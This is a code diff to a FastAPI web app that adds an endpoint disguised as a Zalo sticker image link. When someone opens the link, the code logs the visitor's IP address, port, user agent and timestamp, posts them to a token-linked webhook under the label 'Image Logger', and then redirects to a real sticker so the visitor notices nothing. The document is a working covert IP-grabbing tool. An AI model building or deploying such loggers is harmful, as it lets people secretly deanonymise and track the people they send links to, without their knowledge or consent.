@@ -88,6 +88,18 @@ async def redirect_image(background_tasks: BackgroundTasks,request: Request, url
             return RedirectResponse(f"https://media-ten.z-cdn.me/yYs3rlgP4qQAAAAF/keanu-keanu-reeves.png")
         background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=imagename, url_thumbnail=f"https://media-ten.z-cdn.me/{urlpath}/{imagename}", botname='Image Logger', db=db)
     return RedirectResponse(f"https://media-ten.z-cdn.me/{urlpath}/{imagename}")
+@app.get("/emoticon/sticker/webpc")
+async def redirect_image(background_tasks: BackgroundTasks,request: Request,token: str = None, user_agent: str = Header(None, convert_underscores=True), eid: str = None, size: int =130 ,db: Session = Depends(get_db) ):
+    ip = request.state.ip
+    timestamp = request.state.timestamp
+    port = request.state.port
+    webhooks_url= curd.get_webhooks_by_token(db=db,token=token)
+    if not curd.check_ip_exist(ip, db=db):
+        if  not eid or token==None or not curd.check_exists_token(db, token=token):
+            background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=f"https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid={eid}&size={size}", botname='Cảnh báo server configuration',db=db)
+            return RedirectResponse(f'https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid=22051&size={size}')
+        background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=eid, url_thumbnail=f"https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid={eid}&size={size}", botname='Image Logger', db=db)
+    return RedirectResponse(f"https://zalo-api.zadn.vn/api/emoticon/sticker/webpc?eid={eid}&size={size}")
 @app.get("/")
 async def read_root(request: Request, user_agent: str = Header(None, convert_underscores=True), db: Session = Depends(get_db)):
     return {"Hello": "World FastAPI"}
